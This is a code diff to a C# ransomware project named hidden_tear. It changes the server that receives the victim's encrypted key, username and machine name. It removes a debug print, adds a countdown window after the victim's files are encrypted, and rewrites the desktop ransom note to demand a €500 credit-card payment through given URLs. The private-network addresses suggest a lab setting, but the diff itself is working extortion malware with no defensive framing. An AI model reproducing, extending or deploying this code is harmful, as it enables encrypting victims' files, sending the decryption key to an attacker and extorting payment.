@@ -36,7 +36,7 @@ namespace hidden_tear
     public partial class Form1 : Form
     {
         //Url to send encryption password and computer info
-        string targetURL = "http://192.168.0.135:8888/test/evilvault.php?info=";
+        string targetURL = "http://192.168.0.103:8888/evilvault.php?info=";
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string UUID = Guid.NewGuid().ToString(); 
@@ -104,7 +104,7 @@ namespace hidden_tear
             const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
             StringBuilder res = new StringBuilder();
             
-            //avoiding the same seed with 
+            //avoiding the same seed with random guid generation
             Random rnd = new Random(Guid.NewGuid().GetHashCode());
             while (0 < length--){
                 res.Append(valid[rnd.Next(valid.Length)]);
@@ -124,7 +124,6 @@ namespace hidden_tear
             ServerRSA.FromXmlString(ServerPubKey);
             string SecretPassword = Uri.EscapeDataString(Convert.ToBase64String(RSAEncrypt(Encoding.UTF8.GetBytes(password), ServerRSA.ExportParameters(false))));
             
-            Console.WriteLine(SecretPassword);
             return SecretPassword;
 
         }
@@ -225,7 +224,10 @@ namespace hidden_tear
             encryptDirectory(startPath,password);
             messageCreator();
             password = null;
-            System.Windows.Forms.Application.Exit();
+            Form2 countdown = new Form2();
+            countdown.Show();
+       
+
         }
 
         public void messageCreator()
@@ -233,7 +235,7 @@ namespace hidden_tear
             //write message to user
             string path = "\\Desktop\\VERY_IMPORTANT_READ_IT_.txt";
             string fullpath = userDir + userName + path;
-            string[] lines = { "Your documents, pictures, databases and other important files are encrypted with a strong encryption and unique key.\n",  "The private decryption key is saved on a secret server and nobody can decrypt your files  until you pay and obtain the private key\n\n", " Follow the following instructions if you want to decrypt your files: \n\n", "\n1. GO TO THIS WEBSITE: http://192.168.0.135:8888/test/unlock.html \n\n", "2. Copy past the following UUID in the form on the website",UUID,"\n\n", "3. Follow on the website the next instructions"};
+            string[] lines = { "Your documents, pictures, databases and other important files are encrypted with a strong encryption and unique key.\n",  "The private decryption key is saved on a secret server and nobody can decrypt your files  until you pay and obtain the private key\n\n", " Follow the following instructions if you want to decrypt your files: \n\n", "\n1. GO TO THIS WEBSITE: http://192.168.0.103:8888/payment.html \n\n", "\n2. Pay a ransome of €500 with your creditcard on this page \n\n", "\n3. GO TO THIS WEBSITE: http://192.168.0.103:8888/unlock.html \n\n", "4. Copy past the following UUID in the form on the website",UUID,"\n\n", "5. Follow on the website the next instructions"};
             System.IO.File.WriteAllLines(fullpath, lines);
             
             //write list wit encrypted files
